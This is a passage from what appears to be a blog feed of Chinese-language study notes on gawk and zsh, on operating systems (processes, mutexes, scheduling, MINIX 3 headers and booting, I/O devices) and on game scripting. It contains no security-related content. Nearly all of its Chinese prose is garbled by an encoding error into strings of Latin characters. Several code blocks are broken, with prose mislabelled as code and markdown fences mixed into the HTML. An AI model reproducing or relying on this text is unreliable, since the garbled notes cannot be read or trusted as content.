(åŒ…æ‹¬ BEGIN ä»£ç å—):</p><h3 id="22-7-3-åˆ›å»ºå‡½æ•°åº“"><a href="#22-7-3-åˆ›å»ºå‡½æ•°åº“" class="headerlink" title="22.7.3 åˆ›å»ºå‡½æ•°åº“"></a>22.7.3 åˆ›å»ºå‡½æ•°åº“</h3><p>åˆ›å»ºä¸€ä¸ªå«æœ‰ gawk ç¨‹åºçš„æ–‡ä»¶, ç„¶ååœ¨å‘½ä»¤è¡Œä¸Šç”¨ <code>-f</code> å‚æ•°æŒ‡å®šåº“æ–‡ä»¶å’Œç¨‹åºæ–‡ä»¶.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -f funclib -f script data<br></code></pre></td></tr></table></figure><h2 id="22-8-å®ä¾‹"><a href="#22-8-å®ä¾‹" class="headerlink" title="22.8 å®ä¾‹"></a>22.8 å®ä¾‹</h2><h1 id="ç¬¬23ç« -ä½¿ç”¨å…¶ä»–-shell"><a href="#ç¬¬23ç« -ä½¿ç”¨å…¶ä»–-shell" class="headerlink" title="ç¬¬23ç«  ä½¿ç”¨å…¶ä»– shell"></a>ç¬¬23ç«  ä½¿ç”¨å…¶ä»– shell</h1><h2 id="23-4-zsh-shell"><a href="#23-4-zsh-shell" class="headerlink" title="23.4 zsh shell"></a>23.4 zsh shell</h2><p>zsh æä¾›äº†ä¸€ç»„æ ¸å¿ƒå†…å»ºå‘½ä»¤, å¹¶æä¾›äº†æ·»åŠ é¢å¤–å‘½ä»¤æ¨¡å— (command module) çš„èƒ½åŠ›, æ¯ä¸ªå‘½ä»¤æ¨¡å—éƒ½ä¸ºç‰¹å®šåœºæ™¯æä¾›äº†å¦å¤–ä¸€ç»„å†…å»ºå‘½ä»¤.</p><h2 id="23-5-zsh-shell-çš„ç»„æˆ"><a href="#23-5-zsh-shell-çš„ç»„æˆ" class="headerlink" title="23.5 zsh shell çš„ç»„æˆ"></a>23.5 zsh shell çš„ç»„æˆ</h2><h1 id="ç¬¬24ç« -ç¼–å†™ç®€å•çš„è„šæœ¬å®ç”¨å·¥å…·"><a href="#ç¬¬24ç« -ç¼–å†™ç®€å•çš„è„šæœ¬å®ç”¨å·¥å…·" class="headerlink" title="ç¬¬24ç«  ç¼–å†™ç®€å•çš„è„šæœ¬å®ç”¨å·¥å…·"></a>ç¬¬24ç«  ç¼–å†™ç®€å•çš„è„šæœ¬å®ç”¨å·¥å…·</h1>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Operating Systems Design and Implementation Note</title>
    <link href="/2022/07/15/Operating-Systems-Design-and-Implementation-Note/"/>
    <url>/2022/07/15/Operating-Systems-Design-and-Implementation-Note/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬äºŒç« -è¿›ç¨‹"><a href="#ç¬¬äºŒç« -è¿›ç¨‹" class="headerlink" title="ç¬¬äºŒç«  è¿›ç¨‹"></a>ç¬¬äºŒç«  è¿›ç¨‹</h1><h2 id="2-1-è¿›ç¨‹ä»‹ç»"><a href="#2-1-è¿›ç¨‹ä»‹ç»" class="headerlink" title="2.1 è¿›ç¨‹ä»‹ç»"></a>2.1 è¿›ç¨‹ä»‹ç»</h2><h3 id="2-1-5-è¿›ç¨‹çš„çŠ¶æ€"><a href="#2-1-5-è¿›ç¨‹çš„çŠ¶æ€" class="headerlink" title="2.1.5 è¿›ç¨‹çš„çŠ¶æ€"></a>2.1.5 è¿›ç¨‹çš„çŠ¶æ€</h3><p>è°ƒåº¦å™¨ï¼Œå†³å®šå“ªä¸ªè¿›ç¨‹åº”å½“è¿è¡Œï¼Œä»¥åŠå®ƒè¿è¡Œå¤šé•¿æ—¶é—´.</p><p>ä¸€äº›åŠ¨ä½œï¼Œè¯¸å¦‚ä¿å­˜å¯„å­˜å™¨å€¼å’Œè®¾ç½®æ ˆæŒ‡é’ˆç­‰æ— æ³•ç”¨Cè¯­è¨€æè¿°ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸ªçŸ­å°çš„æ±‡ç¼–è¯­è¨€ä¾‹ç¨‹æ¥å®Œæˆ.</p><h3 id="2-1-7-çº¿ç¨‹"><a href="#2-1-7-çº¿ç¨‹" class="headerlink" title="2.1.7 çº¿ç¨‹"></a>2.1.7 çº¿ç¨‹</h3><p>å®ƒä»¬å…±äº«ç›¸åŒçš„åœ°å€ç©ºé—´.</p><p>è§‚å¯Ÿè¿›ç¨‹çš„ä¸€ç§æ–¹å¼æ˜¯æŠŠè¿›ç¨‹è§†ä¸ºä¸€ç»„ç›¸å…³èµ„æºçš„é›†åˆã€‚</p><p>è¿›ç¨‹ç”¨æ¥é›†åˆèµ„æºï¼Œè€Œçº¿ç¨‹æ˜¯CPUä¸­è°ƒåº¦çš„å®ä½“.</p><p>è¿›ç¨‹æœ‰è¿›ç¨‹è¡¨ï¼Œçº¿ç¨‹æœ‰çº¿ç¨‹è¡¨.</p><h3 id="2-2-2-ä¸´ç•ŒåŒº"><a href="#2-2-2-ä¸´ç•ŒåŒº" class="headerlink" title="2.2.2 ä¸´ç•ŒåŒº"></a>2.2.2 ä¸´ç•ŒåŒº</h3><p>é¿å…ç«äº‰æ¡ä»¶, é˜²æ­¢å¤šä¸ªè¿›ç¨‹åŒæ—¶è®¿é—®å…±äº«æ•°æ®.</p><p>è¿™é‡ŒæŠŠå¯¹å…±äº«å†…å­˜è¿›è¡Œè®¿é—®çš„ç¨‹åºç‰‡æ®µç§°ä¸º critical region æˆ– critical section.</p><h4 id="TSLæŒ‡ä»¤"><a href="#TSLæŒ‡ä»¤" class="headerlink" title="TSLæŒ‡ä»¤"></a>TSLæŒ‡ä»¤</h4><p>Test and Lockï¼Œå®ƒå°†ä¸€ä¸ªå­˜å‚¨å™¨å­—è¯»åˆ°å¯„å­˜å™¨ä¸­ï¼Œç„¶ååœ¨è¯¥å†…å­˜åœ°å€ä¸Šå­˜ä¸€ä¸ªéé›¶å€¼. è¯¥æŒ‡ä»¤ç»“æŸä¹‹å‰å…¶ä»–å¤„ç†æœºæ„å‡ä¸å…è®¸è®¿é—®è¯¥å­˜å‚¨å™¨.</p><p>æœ‰å¿™ç­‰å¾…çš„ç¼ºç‚¹.</p><p>é€šè¿‡TSLæŒ‡ä»¤æ¥ç¡®ä¿åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªCPUåœ¨å¯¹ä¿¡å·é‡è¿›è¡Œæ“ä½œ.</p><h3 id="2-2-6-Mutex"><a href="#2-2-6-Mutex" class="headerlink" title="2.2.6 Mutex"></a>2.2.6 Mutex</h3><p>äº’æ–¥, Mutex. </p><p>æ˜¯ä¸€ä¸ªå¯ä»¥å¤„äºä¸¤æ€ä¹‹ä¸€çš„å˜é‡: è§£é”å’ŒåŠ é”. å¸¸ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶ä½æˆ–æ•´æ•°è¡¨ç¤º.</p><p>åŠ é”å³éé›¶ï¼Œè¡¨ç¤ºå·²è¢«å ç”¨ã€‚</p><p>è§£é”ä¸º0.</p><p><mark>æ­»é” dead lock</mark><br>ä¸¤ä¸ªè¿›ç¨‹æ°¸è¿œçš„é˜»å¡.</p><h3 id="2-2-7-ç®¡ç¨‹"><a href="#2-2-7-ç®¡ç¨‹" class="headerlink" title="2.2.7 ç®¡ç¨‹"></a>2.2.7 ç®¡ç¨‹</h3><p>monitor, ç®¡ç¨‹ï¼Œæ˜¯ç”±è¿‡ç¨‹ã€å˜é‡åŠæ•°æ®ç»“æ„ç­‰ç»„æˆçš„é›†åˆ.</p><p>ä»»æ„æ—¶åˆ»ç®¡ç¨‹ä¸­åªèƒ½æœ‰ä¸€ä¸ªæ´»è·ƒè¿›ç¨‹.</p><h2 id="2-3-Classical-IPC-Problems"><a href="#2-3-Classical-IPC-Problems" class="headerlink" title="2.3 Classical IPC Problems"></a>2.3 Classical IPC Problems</h2><h3 id="2-3-1-å“²å­¦å®¶è¿›é¤é—®é¢˜"><a href="#2-3-1-å“²å­¦å®¶è¿›é¤é—®é¢˜" class="headerlink" title="2.3.1 å“²å­¦å®¶è¿›é¤é—®é¢˜"></a>2.3.1 å“²å­¦å®¶è¿›é¤é—®é¢˜</h3><p>æ‰€æœ‰çš„ç¨‹åºéƒ½åœ¨è¿è¡Œï¼Œä½†å´æ— æ³•å–å¾—è¿›å±•ç§° starvation é¥¥é¥¿.</p><p>éœ€ä¿è¯æ—¢ä¸ä¼šå‘ç”Ÿæ­»é”åˆä¸ä¼šå‘ç”Ÿé¥¥é¥¿.</p><p>ä¿¡å·é‡çš„ä½¿ç”¨.</p><p>critical region çš„è¿ç”¨.</p><h3 id="2-3-2-è¯»è€…-å†™è€…é—®é¢˜"><a href="#2-3-2-è¯»è€…-å†™è€…é—®é¢˜" class="headerlink" title="2.3.2 è¯»è€…-å†™è€…é—®é¢˜"></a>2.3.2 è¯»è€…-å†™è€…é—®é¢˜</h3><h2 id="2-4-Scheduling"><a href="#2-4-Scheduling" class="headerlink" title="2.4 Scheduling"></a>2.4 Scheduling</h2><p>Schedulerï¼Œè°ƒåº¦å™¨ï¼Œåœ¨æ“ä½œç³»ç»Ÿä¸­å†³å®šå…ˆè¿è¡Œå“ªä¸€ä¸ªè¿›ç¨‹.</p><p>admission scheculer, å‡†å…¥è°ƒåº¦å™¨ï¼Œå†³å®šå“ªäº›ä½œä¸šå…è®¸è¿›å…¥ç³»ç»Ÿ.</p><p>ä¸‰çº§è°ƒåº¦: å‡†å…¥è°ƒåº¦å™¨ï¼Œ CPUè°ƒåº¦å™¨ï¼Œ å†…å­˜è°ƒåº¦å™¨.</p><h3 id="2-4-3-äº¤äº’å¼ç³»ç»Ÿä¸­çš„è°ƒåº¦"><a href="#2-4-3-äº¤äº’å¼ç³»ç»Ÿä¸­çš„è°ƒåº¦" class="headerlink" title="2.4.3 äº¤äº’å¼ç³»ç»Ÿä¸­çš„è°ƒåº¦"></a>2.4.3 äº¤äº’å¼ç³»ç»Ÿä¸­çš„è°ƒåº¦</h3><h4 id="æ—¶é—´ç‰‡è®ºè½¬è°ƒåº¦-Round-Robin-Scheduling"><a href="#æ—¶é—´ç‰‡è®ºè½¬è°ƒåº¦-Round-Robin-Scheduling" class="headerlink" title="æ—¶é—´ç‰‡è®ºè½¬è°ƒåº¦ Round-Robin Scheduling"></a>æ—¶é—´ç‰‡è®ºè½¬è°ƒåº¦ Round-Robin Scheduling</h4><p>æ¯ä¸ªè¿›ç¨‹è¢«åˆ†é…ä¸€ä¸ªæ—¶é—´ç‰‡.</p><h4 id="ä¼˜å…ˆçº§è°ƒåº¦-Priority-Scheduling"><a href="#ä¼˜å…ˆçº§è°ƒåº¦-Priority-Scheduling" class="headerlink" title="ä¼˜å…ˆçº§è°ƒåº¦ Priority Scheduling"></a>ä¼˜å…ˆçº§è°ƒåº¦ Priority Scheduling</h4><p>æ¯ä¸ªè¿›ç¨‹è¢«èµ‹äºˆä¸€ä¸ªä¼˜å…ˆçº§ï¼Œç‡å…ˆè¿è¡Œä¼˜å…ˆçº§æœ€é«˜çš„å°±ç»ªè¿›ç¨‹.</p><p>ä¼˜å…ˆçº§å¯ä»¥ä¸ºé™æ€æˆ–åŠ¨æ€.</p><h3 id="2-4-4-å®æ—¶ç³»ç»Ÿè°ƒåº¦-Scheduling-in-Real-Time-Systems"><a href="#2-4-4-å®æ—¶ç³»ç»Ÿè°ƒåº¦-Scheduling-in-Real-Time-Systems" class="headerlink" title="2.4.4 å®æ—¶ç³»ç»Ÿè°ƒåº¦ Scheduling in Real-Time Systems"></a>2.4.4 å®æ—¶ç³»ç»Ÿè°ƒåº¦ Scheduling in Real-Time Systems</h3><p>é€šå¸¸åˆ†ä¸º: ç¡¬å®æ—¶å’Œè½¯å®æ—¶.</p><h2 id="2-5-MINIX-3-è¿›ç¨‹æ¦‚è¿°"><a href="#2-5-MINIX-3-è¿›ç¨‹æ¦‚è¿°" class="headerlink" title="2.5 MINIX 3 è¿›ç¨‹æ¦‚è¿°"></a>2.5 MINIX 3 è¿›ç¨‹æ¦‚è¿°</h2><p>æ±‡ç¼–è¯­è¨€è´Ÿè´£å†…æ ¸ç›´æ¥ä¸ç¡¬ä»¶äº¤äº’çš„æœ€åº•å±‚éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†ä¸èƒ½ç”¨Cå®ç°.</p><p>è¿›ç¨‹éƒ½æ½œåœ¨å…·æœ‰ä¸€å®šçš„ç‰¹æƒï¼Œè¿™æ˜¯ç¬¬äºŒå±‚ã€ç¬¬ä¸‰å±‚å’Œç¬¬å››å±‚å†…çš„è¿›ç¨‹çœŸæ­£çš„ä¸åŒä¹‹å¤„.</p><p>ç†è§£ kernel call å’Œ POSIX system call çš„åŒºåˆ«éå¸¸é‡è¦.</p><p>å†…æ ¸è°ƒç”¨æ˜¯ç”±ç³»ç»ŸæœåŠ¡æä¾›çš„ä»¥ä½¿é©±åŠ¨ç¨‹åºå’ŒæœåŠ¡å™¨å®Œæˆå·¥ä½œçš„åº•å±‚å‡½æ•°.</p><p>POSIXç³»ç»Ÿè°ƒç”¨æ˜¯ç”±POSIXè§„èŒƒå®šä¹‰çš„é«˜å±‚è°ƒç”¨.</p><p>åœ¨initè¿›ç¨‹è¿è¡Œä¹‹å‰ï¼Œå°±æœ‰ä¸€äº›ç³»ç»Ÿè¿›ç¨‹å·²ç»è¿è¡Œäº†.</p><p>åœ¨ç±»UNIXç³»ç»Ÿä¸­ï¼Œinitè¢«èµ‹äºˆçš„PIDä¸º1.</p><p>rcè„šæœ¬çš„ä¸€ä¸ªé‡è¦åŠŸèƒ½æ˜¯æ£€æŸ¥å¯èƒ½ç”±ä¸Šæ¬¡ç³»ç»Ÿå´©æºƒæ‰€å¼•èµ·çš„æ–‡ä»¶ç³»ç»Ÿé”™è¯¯.</p><p>ä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰ä¿¡æ¯éƒ½ä¿å­˜åœ¨è¿›ç¨‹è¡¨ä¸­ï¼Œè¿›ç¨‹è¡¨åˆ’åˆ†æˆä¸ºå†…æ ¸ã€å†…å­˜ç®¡ç†å™¨å’Œæ–‡ä»¶ç³»ç»Ÿä¸‰éƒ¨åˆ†, åˆ†åˆ«æ‹¥æœ‰å®ƒä»¬å„è‡ªæ‰€éœ€è¦çš„é‚£äº›åŸŸ.</p><h3 id="2-5-3-MINIX-3-ä¸­çš„è¿›ç¨‹é—´é€šä¿¡"><a href="#2-5-3-MINIX-3-ä¸­çš„è¿›ç¨‹é—´é€šä¿¡" class="headerlink" title="2.5.3 MINIX 3 ä¸­çš„è¿›ç¨‹é—´é€šä¿¡"></a>2.5.3 MINIX 3 ä¸­çš„è¿›ç¨‹é—´é€šä¿¡</h3><p>é˜»å¡ï¼šæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ç”±äºå‘ç”ŸæŸäº‹è€Œæš‚æ—¶æ— æ³•ç»§ç»­æ‰§è¡Œ.</p><h3 id="2-5-4-MINIX-3-ä¸­çš„è¿›ç¨‹è°ƒåº¦"><a href="#2-5-4-MINIX-3-ä¸­çš„è¿›ç¨‹è°ƒåº¦" class="headerlink" title="2.5.4 MINIX 3 ä¸­çš„è¿›ç¨‹è°ƒåº¦"></a>2.5.4 MINIX 3 ä¸­çš„è¿›ç¨‹è°ƒåº¦</h3><p>ä¸­æ–­ç³»ç»Ÿèƒ½ä½¿å¤šé“ç¨‹åºæ“ä½œç³»ç»ŸæŒç»­ä¸æ–­åœ°å·¥ä½œ,</p><p>ä»»åŠ¡é€šå¸¸æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œé©±åŠ¨ç¨‹åºæ¬¡ä¹‹ï¼ŒæœåŠ¡å™¨å†æ¬¡ï¼Œæœ€åæ˜¯ç”¨æˆ·è¿›ç¨‹ã€‚</p><p>åªæœ‰å½“æ‰€æœ‰çš„ç³»ç»Ÿè¿›ç¨‹éƒ½æ— äº‹å¯åšæ—¶ï¼Œç”¨æˆ·è¿›ç¨‹æ‰èƒ½è¿è¡Œã€‚ç³»ç»Ÿè¿›ç¨‹ä¸ä¼šè¢«ç”¨æˆ·è¿›ç¨‹é˜»æ­¢è¿è¡Œ.</p><h2 id="2-6-MINIX-3-ä¸­è¿›ç¨‹çš„å®ç°"><a href="#2-6-MINIX-3-ä¸­è¿›ç¨‹çš„å®ç°" class="headerlink" title="2.6 MINIX 3 ä¸­è¿›ç¨‹çš„å®ç°"></a>2.6 MINIX 3 ä¸­è¿›ç¨‹çš„å®ç°</h2><p>â€œè¿‡ç¨‹â€ã€â€œå‡½æ•°â€ã€ä»¥åŠâ€œä¾‹ç¨‹â€å¯ä»¥æ··ç”¨ã€‚</p><p>æ¯ä¸€ä¸ªCç¼–è¯‘å™¨éƒ½ä¼šåˆ°ä¸€ä¸ªé»˜è®¤çš„å¤´æ–‡ä»¶ç›®å½•ä¸­å»æŸ¥æ‰¾includeæ–‡ä»¶ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ä¸ªç›®å½•æ˜¯<code>/usr/include/</code>.</p><p>å½“ä¸€ä¸ª<code>include</code>æ–‡ä»¶æ˜¯åœ¨ä¸€ä¸ªå°äºå·å’Œä¸€ä¸ªå¤§äºå·ä¹‹é—´<code>&lt;&gt;</code>è¢«å¼•ç”¨æ—¶ï¼Œç¼–è¯‘å™¨åˆ™åˆ°é»˜è®¤å¤´æ–‡ä»¶ç›®å½•æˆ–è€…ä¸€ä¸ªæŒ‡å®šç›®å½•ä¸­å»æŸ¥æ‰¾è¯¥æ–‡ä»¶.</p><p><code>&quot;&quot;</code>ä¸­æ˜¯æœ¬åœ°å¤´æ–‡ä»¶.</p><p><code>src</code>ç›®å½•åº”è¯¥æ˜¯<code>source</code>æºä»£ç ç›®å½•.</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿä¸­çš„ä¸‰å¤§å—é€šç”¨çš„ç¨‹åºåªæœ‰<code>/src/lib/</code>ç›®å½•ä¸­çš„åº“ç¨‹åº.</p><p>ç‰¹æ€§æµ‹è¯•å®ï¼Œfeature test macro, å¦‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ANSI</span><br></code></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘ä¸€ä¸ªCç¨‹åºæ—¶ï¼Œæ•°æ®ç»“æ„ã€å‚æ•°ä»¥åŠå‡½æ•°è¿”å›å€¼åœ¨å¼•ç”¨å®ƒä»¬çš„ä»£ç ä¹‹å‰å¿…é¡»æ˜¯å·²çŸ¥çš„ã€‚å› æ­¤Cå…è®¸åœ¨å®šä¹‰ä¹‹å‰ä½¿ç”¨å‡½æ•°åŸå‹æ¥å£°æ˜ä¸€ä¸ªå‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼.</p><p>åœ¨ä¸€æ¬¡ç¼–è¯‘ä¸­ï¼Œä¸€ä¸ªå¤´æ–‡ä»¶åº”è¯¥ä»…è¢«åŒ…å«ä¸€æ¬¡, ä½¿ç”¨:&#96;&#96;&#96;<br>  #ifndef â€¦<br>  â€¦<br>  #endif</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs prolog">æ‰€æœ‰çš„ç±»å‹åéƒ½ä»¥<span class="hljs-string">&quot;_t&quot;</span>ç»“å°¾ï¼Œè¿™ä¸ä»…æ˜¯ä¸€ç§ä¹ æƒ¯ï¼Œè€Œä¸”æ˜¯<span class="hljs-symbol">POSIX</span>æ ‡å‡†è§„å®š.<br><br>å¯¹äºç¼–è¯‘å™¨ï¼Œé¦–å­—æ¯å¤§å†™çš„æ‰€æœ‰ç±»å‹éƒ½ç­‰ä»·äºintç±»å‹.<br>### <span class="hljs-number">2.6</span><span class="hljs-number">.4</span> <span class="hljs-symbol">MINIX</span> <span class="hljs-number">3</span> å¤´æ–‡ä»¶<br>ä»¥ä¸‹åˆ’çº¿å¼€å¤´å¯ä»¥é™ä½å†²çªçš„å¯èƒ½æ€§.<br><br>å¯¹äºç£ç›˜çš„ç¼“å­˜æ¥è¯´ï¼Œç”¨äºæ–‡ä»¶ç³»ç»Ÿçš„ç¼“å­˜å®¹é‡æ˜¯è¶Šå¤§è¶Šå¥½.<br><br>å£°æ˜è¢«åŒ…å«äºä¸¤ä¸ªä»¥ä¸Šçš„æ–‡ä»¶ä¸­ï¼Œåˆ™æœ‰äº›é“¾æ¥ç¨‹åºå°†ä¼šæŠŠå®ƒè®¤åšå˜é‡å¤šé‡å®šä¹‰é”™è¯¯.<br>### <span class="hljs-number">2.6</span><span class="hljs-number">.6</span> å¼•å¯¼<span class="hljs-symbol">MINIX</span> <span class="hljs-number">3</span><br>æœªåˆ†åŒºç£ç›˜ï¼Œç¬¬ä¸€ä¸ªæ‰‡åŒºæ˜¯å¼•å¯¼å—ã€‚<br><br>å·²åˆ†åŒºç£ç›˜ï¼Œç¬¬ä¸€ä¸ªæ‰‡åŒºæ˜¯ä¸»å¼•å¯¼è®°å½•(å«åˆ†åŒºè¡¨)ï¼Œåˆç§°ä¸»å¼•å¯¼ç¨‹åº. é€šå¸¸æœ‰ä¸”åªæœ‰ä¸€ä¸ªåˆ†åŒºè¢«è¡¨ç¤ºä¸ºæ´»åŠ¨çŠ¶æ€.<br><br>ä¸€ä¸ª<span class="hljs-symbol">MINIX</span>åˆ†åŒºä¸ä¸€ä¸ªæœªåˆ†åŒºçš„<span class="hljs-symbol">MINIX</span> <span class="hljs-number">3</span> è½¯ç›˜ç»“æ„ç›¸åŒ.<br><br>åœ¨è£…å…¥æ“ä½œç³»ç»Ÿä¹‹å‰æ— æ³•é€šè¿‡ç›®å½•å’Œæ–‡ä»¶åæ¥å®šä½ä¸€ä¸ªæ–‡ä»¶.<br><br>é€šå¸¸<span class="hljs-string">`#include`</span>ç”¨æ¥åŒ…å«å¤´æ–‡ä»¶, ä½†ä¹Ÿå¯ä»¥ç”¨æ¥é€‰æ‹©æºä»£ç çš„é€‚å½“éƒ¨åˆ†.<br></code></pre></td></tr></table></figure><p>  #include &lt;minix&#x2F;config.h&gt;<br>  #if _WORD_SIZE &#x3D;&#x3D; 2<br>  #include â€œmpx88.sâ€<br>  #else<br>  #include â€œmpx386.sâ€<br>  #endif</p><pre><code class="hljs">åœ¨Cè¯­è¨€ä¸­`a[i]`åªæ˜¯`*(a+i)`çš„å¦ä¸€ç§å†™æ³•.## 3 Input/Outputæ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½ä¹‹ä¸€æ˜¯æ§åˆ¶æ‰€æœ‰çš„è¾“å…¥/è¾“å‡ºè®¾å¤‡.### 3.1.1 I/Oè®¾å¤‡å¤§è‡´åˆ†ä¸ºä¸¤ç±»: 1. block device, å—è®¾å¤‡ 2. character device, å­—ç¬¦è®¾å¤‡å—è®¾å¤‡å°†ä¿¡æ¯å­˜å‚¨åœ¨å›ºå®šå¤§å°çš„å—ä¸­ï¼Œæ¯ä¸ªå—éƒ½æœ‰è‡ªå·±çš„åœ°å€ã€‚æ•°æ®å—çš„å¤§å°é€šå¸¸åœ¨512å­—èŠ‚åˆ°32768å­—èŠ‚ä¹‹é—´ã€‚å—è®¾å¤‡çš„åŸºæœ¬ç‰¹å¾æ˜¯æ¯ä¸ªå—éƒ½èƒ½å¤Ÿç‹¬ç«‹äºå…¶ä»–å—è€Œè¯»å†™ã€‚ç£ç›˜æ˜¯å¸¸ç”¨çš„å—è®¾å¤‡.å­—ç¬¦è®¾å¤‡å‘é€æˆ–æ¥å—çš„æ˜¯å­—ç¬¦æµï¼Œè€Œä¸è€ƒè™‘ä»»ä½•å—ç»“æ„ã€‚å­—ç¬¦è®¾å¤‡æ— æ³•ç¼–å€ï¼Œä¹Ÿä¸å­˜åœ¨ä»»ä½•å¯»å€æ“ä½œã€‚æ‰“å°æœºã€ç½‘ç»œæ¥å£ã€é¼ æ ‡ä»¥åŠå¤§å¤šæ•°ä¸ç£ç›˜ä¸åŒçš„è®¾å¤‡å‡å¯è¢«è§†ä¸ºå­—ç¬¦è®¾å¤‡.æ—¶é’Ÿçš„å…¨éƒ¨åŠŸèƒ½å°±æ˜¯æŒ‰ç…§é¢„å…ˆå®šä¹‰çš„æ—¶é—´é—´éš”å‘å‡ºä¸­æ–­.æ–‡ä»¶ç³»ç»Ÿä»…ä»…æ§åˆ¶æŠ½è±¡çš„å—è®¾å¤‡ï¼Œè€ŒæŠŠä¸è®¾å¤‡æ— å…³çš„éƒ¨åˆ†ç•™ç»™è¾ƒåº•å±‚è½¯ä»¶ï¼Œå³è®¾å¤‡é©±åŠ¨ç¨‹åº(device driver)å»å¤„ç†ã€‚### 3.1.2 è®¾å¤‡æ§åˆ¶å™¨I/Oè®¾å¤‡é€šå¸¸ç”±ä¸€ä¸ªæœºæ¢°éƒ¨ä»¶å’Œä¸€ä¸ªç”µå­éƒ¨ä»¶ç»„æˆã€‚ç”µå­éƒ¨ä»¶ç§°ä¸º device controllerï¼Œè®¾å¤‡æ§åˆ¶å™¨æˆ– adapter, é€‚é…å™¨. æœºæ¢°éƒ¨ä»¶åˆ™æ˜¯è®¾å¤‡æœ¬èº«.æ“ä½œç³»ç»Ÿå¤§å¤šä¸æ§åˆ¶å™¨ä¹‹é—´é€šä¿¡ï¼Œè€Œéè®¾å¤‡æœ¬èº«.preambleï¼Œå‰å¯¼ç¬¦æ˜¯ç£ç›˜æ ¼å¼åŒ–æ—¶å†™è¿›å»çš„ï¼Œä»–åŒ…æ‹¬æŸ±é¢æ•°å’Œæ‰‡åŒºæ•°ã€æ‰‡åŒºå¤§å°ä¹‹ç±»çš„æ•°æ®ï¼Œè¿˜åŒ…æ‹¬åŒæ­¥ä¿¡æ¯ã€‚åœ¨å¯¹æ£€éªŒå’Œè¿›è¡Œæ ¡éªŒå¹¶è¯æ˜æ•°æ®å¿«æ²¡æœ‰é”™è¯¯åï¼Œå­—èŠ‚å¿«å°†è¢«å¤åˆ¶åˆ°ä¸»å­˜ä¸­.### 3.1.3 å†…å­˜æ˜ å°„I/Oæ¯ä¸ªæ§åˆ¶å™¨éƒ½æœ‰ä¸€äº›ç”¨æ¥ä¸CPUé€šä¿¡çš„å¯„å­˜å™¨ã€‚é™¤äº†è¿™äº›æ§åˆ¶å¯„å­˜å™¨ä¹‹å¤–ï¼Œè®¸å¤šè®¾å¤‡è¿˜æœ‰ä¸€ä¸ªæ“ä½œç³»ç»Ÿå¯ä»¥è¯»å†™çš„æ•°æ®ç¼“å†²åŒº.CPUä¸æ§åˆ¶å¯„å­˜å™¨å’Œè®¾å¤‡çš„æ•°æ®ç¼“å†²åŒºè¿›è¡Œé€šä¿¡çš„æ–¹æ³•: 1. åˆ†é…I/Oç«¯å£å·, å†…å­˜å’ŒI/Oçš„åœ°å€ç©ºé—´æ˜¯ä¸åŒçš„ 2. å†…å­˜æ˜ å°„I/O, I/Oå¯„å­˜å™¨æ˜¯å†…å­˜åœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†. æ¯ä¸ªæ§åˆ¶å¯„å­˜å™¨è¢«åˆ†é…å”¯ä¸€çš„ä¸€ä¸ªå†…å­˜åœ°å€ï¼Œè€Œä¸”ä¸ä¼šæœ‰å†…å­˜åˆ†é…è¿™ä¸€åœ°å€. é€šå¸¸åˆ†é…ç»™æ§åˆ¶å¯„å­˜å™¨çš„åœ°å€ä½äºåœ°å€ç©ºé—´çš„é¡¶ç«¯.### 3.1.4 ä¸­æ–­ p154</code></pre>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Game Scripting Mastery Note</title>
    <link href="/2022/07/15/Game-Scripting-Mastery-Note/"/>
    <url>/2022/07/15/Game-Scripting-Mastery-Note/</url>
    
    <content type="html"><![CDATA[<h1 id="CHAPTER-1-AN-INTRODUCTION-TO-SCRIPTING"><a href="#CHAPTER-1-AN-INTRODUCTION-TO-SCRIPTING" class="headerlink" title="CHAPTER 1 AN INTRODUCTION TO SCRIPTING"></a>CHAPTER 1 AN INTRODUCTION TO SCRIPTING</h1><h2 id="WHAT-IS-SCRIPTING"><a href="#WHAT-IS-SCRIPTING" class="headerlink" title="WHAT IS SCRIPTING?"></a>WHAT IS SCRIPTING?</h2><h2 id="STRUCTURED-GAME-CONTENT-â€“-A-SIMPLE-APPROACH"><a href="#STRUCTURED-GAME-CONTENT-â€“-A-SIMPLE-APPROACH" class="headerlink" title="STRUCTURED GAME CONTENT â€“ A SIMPLE APPROACH"></a>STRUCTURED GAME CONTENT â€“ A SIMPLE APPROACH</h2><h2 id="IMPROVING-THE-METHOD-WITH-LOGICAL-AND-PHYSICAL-SEPARATION"><a href="#IMPROVING-THE-METHOD-WITH-LOGICAL-AND-PHYSICAL-SEPARATION" class="headerlink" title="IMPROVING THE METHOD WITH LOGICAL AND PHYSICAL SEPARATION"></a>IMPROVING THE METHOD WITH LOGICAL AND PHYSICAL SEPARATION</h2>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
